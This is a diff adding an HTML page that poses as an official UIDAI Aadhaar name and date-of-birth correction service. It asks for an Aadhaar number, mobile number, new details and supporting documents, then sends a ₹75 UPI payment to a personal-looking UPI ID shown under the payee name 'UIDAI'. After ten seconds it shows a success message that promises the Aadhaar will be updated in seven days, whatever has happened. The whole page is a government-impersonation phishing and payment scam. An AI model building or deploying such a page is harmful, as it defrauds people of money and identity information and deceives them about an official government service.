@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Aadhaar Name & DOB Correction</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Aadhaar logo from official UIDAI site -->
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/hi/c/cf/Aadhaar_Logo.svg">
+  <style>
+    @import url('https://fonts.googleapis.com/css?family=Times+New+Roman:italic,regular');
+    body {
+      font-family: 'Times New Roman', Times, serif;
+      background: #f5f5f5;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 420px;
+      background: #fff;
+      margin: 40px auto;
+      border-radius: 12px;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.12);
+      padding: 32px 24px 24px 24px;
+    }
+    .logo {
+      display: block;
+      margin: 0 auto 12px auto;
+      width: 96px;
+    }
+    h1 {
+      font-family: 'Times New Roman', Times, serif;
+      font-style: italic;
+      color: #e60000;
+      text-align: center;
+      font-size: 1.6em;
+      margin-bottom: 22px;
+      letter-spacing: 1px;
+    }
+    label {
+      font-size: 1em;
+      margin-top: 12px;
+      display: block;
+      color: #333;
+    }
+    input[type="text"], input[type="number"], input[type="date"], input[type="file"] {
+      width: 100%;
+      padding: 8px 10px;
+      margin-top: 4px;
+      margin-bottom: 14px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-family: 'Times New Roman', Times, serif;
+      font-size: 1em;
+    }
+    input[type="file"] {
+      border: none;
+    }
+    .btn {
+      background: #e60000;
+      color: #fff;
+      border: none;
+      width: 100%;
+      padding: 12px 0;
+      border-radius: 4px;
+      font-size: 1.1em;
+      font-family: 'Times New Roman', Times, serif;
+      font-style: italic;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background 0.2s;
+    }
+    .btn:hover {
+      background: #b30000;
+    }
+    .hidden {
+      display: none;
+    }
+    .success-message {
+      text-align: center;
+      color: #1a7d1a;
+      font-size: 1.2em;
+      margin-top: 24px;
+      font-family: 'Times New Roman', Times, serif;
+      font-style: italic;
+      font-weight: bold;
+    }
+    .note {
+      font-size: 0.95em;
+      color: #888;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    .footer {
+      text-align: center;
+      font-size: 0.92em;
+      color: #aaa;
+      margin-top: 26px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://uidai.gov.in/images/logo_aadhaar.png" alt="Aadhaar Logo" class="logo">
+    <h1>Aadhaar Name & DOB Correction</h1>
+    <div class="note">Update your Aadhaar details online. Powered by UIDAI.</div>
+    <form id="correctionForm">
+      <label for="aadhaar">Aadhaar Number</label>
+      <input type="text" id="aadhaar" name="aadhaar" maxlength="12" pattern="\d{12}" required placeholder="Enter 12-digit Aadhaar number">
+
+      <label for="mobile">Registered Mobile Number</label>
+      <input type="text" id="mobile" name="mobile" maxlength="10" pattern="\d{10}" required placeholder="Enter 10-digit mobile number">
+
+      <label for="name">Updated Name</label>
+      <input type="text" id="name" name="name" maxlength="50" required placeholder="Enter new name">
+
+      <label for="nameDoc">Upload Name Change Supporting Document</label>
+      <input type="file" id="nameDoc" name="nameDoc" accept=".pdf,.jpg,.jpeg,.png" required>
+
+      <label for="dob">Updated Date of Birth</label>
+      <input type="date" id="dob" name="dob" required>
+
+      <label for="dobDoc">Upload DOB Change Supporting Document</label>
+      <input type="file" id="dobDoc" name="dobDoc" accept=".pdf,.jpg,.jpeg,.png" required>
+
+      <button type="button" class="btn" id="payBtn">Proceed to Payment (₹75)</button>
+    </form>
+    <div id="successMsg" class="success-message hidden">
+      Your Aadhaar will be updated in 7 Days.<br>Thank you!
+    </div>
+    <div class="footer">
+      &copy; 2025 Unique Identification Authority of India (UIDAI)
+    </div>
+  </div>
+  <script>
+    // UPI payment parameters
+    const upiId = '7990983122@ptsbi';
+    const amount = 75;
+    const payeeName = 'UIDAI';
+
+    document.getElementById('payBtn').onclick = function() {
+      // Basic form validation
+      const aadhaar = document.getElementById('aadhaar').value.trim();
+      const mobile = document.getElementById('mobile').value.trim();
+      const name = document.getElementById('name').value.trim();
+      const dob = document.getElementById('dob').value.trim();
+      const nameDoc = document.getElementById('nameDoc').files.length;
+      const dobDoc = document.getElementById('dobDoc').files.length;
+
+      if(!/^\d{12}$/.test(aadhaar)) {
+        alert('Please enter a valid 12-digit Aadhaar number.');
+        return;
+      }
+      if(!/^\d{10}$/.test(mobile)) {
+        alert('Please enter a valid 10-digit mobile number.');
+        return;
+      }
+      if(name.length < 3) {
+        alert('Please enter a valid updated name.');
+        return;
+      }
+      if(!dob) {
+        alert('Please select a valid date of birth.');
+        return;
+      }
+      if(!nameDoc) {
+        alert('Please upload supporting document for name change.');
+        return;
+      }
+      if(!dobDoc) {
+        alert('Please upload supporting document for DOB change.');
+        return;
+      }
+
+      // UPI deep link (works on most mobile devices)
+      const upiUrl = `upi://pay?pa=${encodeURIComponent(upiId)}&pn=${encodeURIComponent(payeeName)}&am=${amount}&cu=INR&tn=Aadhaar+Correction+Fee`;
+
+      // Open UPI payment in new tab or redirect
+      window.location.href = upiUrl;
+
+      // After 10 seconds, show success message
+      setTimeout(function() {
+        document.getElementById('correctionForm').classList.add('hidden');
+        document.getElementById('successMsg').classList.remove('hidden');
+      }, 10000);
+    };
+  </script>
+</body>
+</html>
+        
